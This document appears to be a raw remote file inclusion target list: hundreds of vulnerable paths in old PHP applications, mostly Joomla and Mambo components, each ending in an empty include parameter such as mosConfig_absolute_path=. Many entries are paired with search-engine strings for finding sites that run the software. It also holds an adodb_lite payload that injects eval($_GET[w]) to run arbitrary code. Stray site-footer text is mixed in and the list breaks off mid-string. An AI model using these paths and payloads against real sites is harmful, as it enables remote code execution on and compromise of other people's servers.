/components/com_flyspray/startdown.php?file=
/administrator/components/com_admin/admin.admin.html.php?mosConfig_absolute_path=
/components/com_simpleboard/file_upload.php?sbp=
/components/com_hashcash/server.php?mosConfig_absolute_path=
/components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?mosConfig_absolute_path=
/components/com_sitemap/sitemap.xml.php?mosConfig_absolute_path= /components/com_performs/performs.php?mosConfig_absolute_path=
/components/com_forum/download.php?phpbb_root_path=
/components/com_pccookbook/pccookbook.php?mosConfig_absolute_path=
/components/com_extcalendar/extcalendar.php?mosConfig_absolute_path=
/components/minibb/index.php?absolute_path=
/components/com_smf/smf.php?mosConfig_absolute_path= /modules/mod_calendar.php?absolute_path=
/components/com_pollxt/conf.pollxt.php?mosConfig_absolute_path=
/components/com_loudmounth/includes/abbc/abbc.class.php?mosConfig_absolute_path=
/components/com_videodb/core/videodb.class.xml.php?mosConfig_absolute_path=
/components/com_pcchess/include.pcchess.php?mosConfig_absolute_path=
/administrator/components/com_multibanners/extadminmenus.class.php?mosConfig_absolute_path= /administrator/components/com_mgm/help.mgm.php?mosConfig_absolute_path=
/components/com_mambatstaff/mambatstaff.php?mosConfig_absolute_path=
/components/com_securityimages/configinsert.php?mosConfig_absolute_path=
/components/com_securityimages/lang.php?mosConfig_absolute_path=
/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=
/components/com_galleria/galleria.html.php?mosConfig_absolute_path= /akocomments.php?mosConfig_absolute_path=
/administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir=
/cropcanvas.php?cropimagedir=
/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=
/administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path=
/components/com_zoom/classes/fs_unix.php?mosConfig_absolute_path= /components/com_zoom/includes/database.php?mosConfig_absolute_path=
/administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path=
/components/com_fm/fm.install.php?lm_absolute_path=
/administrator/components/com_mambelfish/mambelfish.class.php?mosConfig_absolute_path=
/components/com_lmo/lmo.php?mosConfig_absolute_path=
/administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php?mosConfig_absolute_path= /components/com_mtree/Savant2/Savant2_Plugin_textarea.php?mosConfig_absolute_path=
/administrator/components/com_jim/install.jim.php?mosConfig_absolute_path=
/administrator/components/com_webring/admin.webring.docs.php?component_dir=
/administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path=
/administrator/components/com_babackup/classes/Tar.php?mosConfig_absolute_path=
/administrator/components/com_lurm_constructor/admin.lurm_constructor.php?lm_absolute_path= /components/com_mambowiki/Mam***ogin.php?IP=
/administrator/components/com_a6mambocredits/admin.a6mambocredits.php?mosConfig_live_site=
/administrator/components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path=
/components/com_cpg/cpg.php?mosConfig_absolute_path=
/components/com_moodle/moodle.php?mosConfig_absolute_path=
/components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path= /components/com_mospray/scripts/admin.php?basedir=
/administrator/components/com_bayesiannaivefilter/lang.php?mosConfig_absolute_path=
/administrator/components/com_uhp/uhp_config.php?mosConfig_absolute_path=
/administrator/components/com_peoplebook/param.peoplebook.php?mosConfig_absolute_path=
/administrator/components/com_mmp/help.mmp.php?mosConfig_absolute_path=
/components/com_reporter/processor/reporter.sql.php?mosConfig_absolute_path= /components/com_madeira/img.php?url=
/components/com_jd-wiki/lib/tpl/default/main.php?mosConfig_absolute_path=
/components/com_bsq_sitestats/external/rssfeed.php?baseDir=
/com_bsq_sitestats/external/rssfeed.php?baseDir=
/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=
/administrator/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path= /components/com_nfn_addressbook/nfnaddressbook.php?mosConfig_absolute_path=
/administrator/components/com_nfn_addressbook/nfnaddressbook.php?mosConfig_absolute_path=
/components/com_joomlaboard/file_upload.php?sbp=
/components/com_rwcards/rwcards.advancedate.php?mosConfig_absolute_path=
/components/com_thopper/inc/contact_type.php?mosConfig_absolute_path=
/components/com_thopper/inc/itemstatus_type.php?mosConfig_absolute_path= /components/com_thopper/inc/projectstatus_type.php?mosConfig_absolute_path=
/components/com_thopper/inc/request_type.php?mosConfig_absolute_path=
/components/com_thopper/inc/responses_type.php?mosConfig_absolute_path=
/components/com_thopper/inc/timelog_type.php?mosConfig_absolute_path=
/components/com_thopper/inc/urgency_type.php?mosConfig_absolute_path=
/components/com_zoom/classes/iptc/EXIF_Makernote.php?mosConfig_absolute_path= /components/com_zoom/classes/iptc/EXIF.php?mosConfig_absolute_path=
/modules/mod_weather.php?absolute_path=
/components/calendar/com_calendar.php?absolute_path=
/modules/calendar/mod_calendar.php?absolute_path=
/components/com_calendar.php?absolute_path=
/modules/mod_calendar.php?absolute_path= /components/com_mosmedia/media.tab.php?mosConfig_absolute_path=
/components/com_mosmedia/media.divs.php?mosConfig_absolute_path=
/administrator/components/com_joomlaradiov5/admin.joomlaradiov5.php?mosConfig_live_site=
/administrator/components/com_joomlaflashfun/admin.joomlaflashfun.php?mosConfig_live_site=
/administrator/components/com_joom12pic/admin.joom12pic.php?mosConfig_live_site=
/components/com_slideshow/admin.slideshow1.php?mosConfig_live_site= /administrator/components/com_panoramic/admin.panoramic.php?mosConfig_live_site=
/administrator/components/com_wmtgallery/admin.wmtgallery.php?mosConfig_live_site=
/administrator/components/com_wmtportfolio/admin.wmtportfolio.php?mosConfig_absolute_path=
/administrator/components/com_mosmedia/includes/credits.html.php?mosConfig_absolute_path=
/administrator/components/com_mosmedia/includes/info.html.php?mosConfig_absolute_path=
/administrator/components/com_mosmedia/includes/media.divs.php?mosConfig_absolute_path= /administrator/components/com_mosmedia/includes/media.divs.js.php?mosConfig_absolute_path=
/administrator/components/com_mosmedia/includes/purchase.html.php?mosConfig_absolute_path=
/administrator/components/com_mosmedia/includes/support.html.php?mosConfig_absolute_path=
/template/babyweb/index.php?template= "WebMaid"
/templates/template.php?content= "NotSopureEdit"
/templates/template.php?content= "/template.php" /templates/template.php?content= "/templates" "/templates"
/template/wm025/footer.php?modules= "/wm025" "/wm025"
/template/babyweb/index.php?template= "/babyweb" "/babyweb"
/errors.php?error= "/typo3conf" "/typo3conf"
/errors.php?error= "/typo" "/typo"
/errors.php?error= "/typo3" "/typo3" /sweetrice/_plugin/subscriber/inc/post.php?root_dir= "/sweetrice" "/sweetrice"
/content/themes/softsaurus_default/pages/subHeader.php?objects_path= "/softsaurus" "/softsaurus"
/content/themes/softsaurus_default/pages/subHeader.php?objects_path= "/subHeader" "/subHeader"
/content/plugins/wallpapers/wallpapers.php?includes_path= "/wallpapers" "/wallpapers"
/include/mail.inc.php?root= "/mail.inc"
/include/mail.inc.php?root= "Rezervi" /inc/bbcode.php?basePath= "deV!L`z Clanportal"
/forum/adminLogin.php?config[forum_installed]= Login | Privacy | Terms of Use | Services | FAQ's | Articles | Affiliate | Invite a Friend | Feedback
/forum/adminLogin.php?config[forum_installed]= "osDate" "osDate"
/forum/adminLogin.php?config[forum_installed]= "/forum" "/forum"
/forum/adminLogin.php?config[forum_installed]= "/adminLogin" /inc/config.php?basePath= "Clanportal"
/inc/config.php?basePath= "/config.php"
/system/database/DB_active_rec.php?BASEPATH= "/database" "/database"
/ecrire.php?lang= "mcGuestbook"
/ecrire.php?lang= "/ecrire.php"
/external.php?url= "/external" /external.php?url= "/external.php?url="
/includes/functions_common.php/modules/vwar/admin/admin.php?vwar_root= Powered by: Virtual War v1.5.0, Copyright ? 2001 - 2004, vwar
/filemanager/skins/mobile/admin1.template.php?net2ftp_globals[application_skinsdir]= "/filemanager"
/filemanager/skins/mobile/admin1.template.php?net2ftp_globals[application_skinsdir]= "ispCP Omega"
/filemanager/skins/mobile/admin1.template.php?net2ftp_globals[application_skinsdir]= "/skins" "/skins" /includes/tgpinc.php?DOCUMENT_ROOT= "/includes/tgpinc.php"
/includes/tgpinc.php?DOCUMENT_ROOT= "Gnat-TGP" "Gnat-TGP"
/includes/tgpinc.php?DOCUMENT_ROOT= "/tgpinc" "/tgpinc"
/Wiky/include/WBmap.php?langFile= "/WBmap" "/WBmap"
/Wiky/include/WBmap.php?langFile= "/Wiky" "/Wiky"
/_center.php?page= "ProMan" "ProMan" /_center.php?page= "/index.php?page"
/_center.php?page= "/_center.php"
/errors.php?error= "/home.php?lng="
/errors.php?error= "/home.php?language="
/errors.php?error= "/home.php?id="
/errors.php?error= "/home.php?to=" /errors.php?error= "/home.php?go="
/errors.php?error= "/home.php?lingua="
/errors.php?error= "/home.php?pagina="
/errors.php?error= "/home.php?page="
/errors.php?error= "/home.php?pag="
/errors.php?error= "/home.php?pg=" /errors.php?error= "/home.php?p="
/errors.php?error= "/home.php?act="
/errors.php?error= "/home.php?pid="
/errors.php?error= "/index.php?x="
/errors.php?error= "/index.php?s="
/errors.php?error= "/index.php?section=" /errors.php?error= "/index.php?sel="
/errors.php?error= "/index.php?go="
/errors.php?error= "/index.php?include="
/errors.php?error= "/index.php?admin="
/errors.php?error= "/index.php?name="
/errors.php?error= "/index.php?lng=" /errors.php?error= "/index.php?language="
/errors.php?error= "/index.php?id="
/errors.php?error= "/index.php?to="
/errors.php?error= "/index.php?go="
/errors.php?error= "/index.php?pagina="
/errors.php?error= "/index.php?page=" /errors.php?error= "/index.php?pag="
/errors.php?error= "/index.php?pg="
/errors.php?error= "/index.php?p="
/errors.php?error= "/index.php?act="
/errors.php?error= "/index.php?pid="
/home.php?page= "/home.php?page=" /home.php?pag= "/home.php?pag="
/home.php?pg= "/home.php?pg="
/linkadmin.php?page= "/linkadmin.php"
///////?cmd&file= "List Users with Pics only?"
/assets/snippets/reflect/snippet.reflect.php?reflect_base= /MODx/
/include/scripts/export_batch.inc.php?DIR= ModernBill /skin_shop/standard/3_plugin_twindow/twindow_notice.php?shop_this_skin_path= technote7
/?sIncPath= "BoonEx- Community Software; Dating And Social Networking Scripts; Video Chat And More."
/parse/parser.php?WN_BASEDIR= WEB//NEWS Personal Newsmanagement - ? 2002-2004 by Christian Scheb - Stylemotion.de
/parse/parser.php?WN_BASEDIR= WEB//NEWS Personal Newsmanagement
?custompluginfile[]= index.php?categoryid=5
?custompluginfile[]= index.php?categoryid=10 ?custompluginfile[]= index.php?categoryid=15
index.php?option=com_content&task=&sectionid=&id=&mosConfig_absolute_path= %22%2Fincludes%2Fjoomla.php%22
/parse/parser.php?WN_BASEDIR= WEB//NEWS Personal Newsmanagement - ? 2002-2004 by Christian Scheb - Stylemotion.de
/?installed_config_file= "PhpJobScheduler"
/pjsfiles/modify.php?installed_config_file= "PhpJobScheduler"
errors.php?error= "/com_rwcards" "/com_rwcards" //vwar/backup/errors.php?error= "errors.php"
/lib/adodb_lite/adodb-perf-module.inc.php?last_module=zZz_ADOConnection{}eval($_GET[w]);class%20zZz_ADOConnection{}//&w=include
($_GET[a]);&a= "powered by CMS Made Simple version"
/s_loadenv.inc.php?DOCUMENT_ROOT= "netcat require"
/components/com_rwcards/rwcards.advancedate.php?mosConfig_absolute_path= "php?option=com_rwcards" "php?
option=com_rwcards" inc/functions.inc.php?config[ppa_root_path]= "Index - Albums"
phphtml.php?htmlclass_path= "phphtml.php"
lib/adodb_lite/adodb-perf-module.inc.php?last_module=zZz_ADOConnection{}eval($_GET[w]);class%20zZz_ADOConnection{}//&w=include
($_GET[a]);&a= "/adodb_lite" "/adodb_lite"
/?path%5Bdocroot%5D= "/newspublish" "/newspublish"
/?sIncPath= %22Links%22+%22%7C%22+%
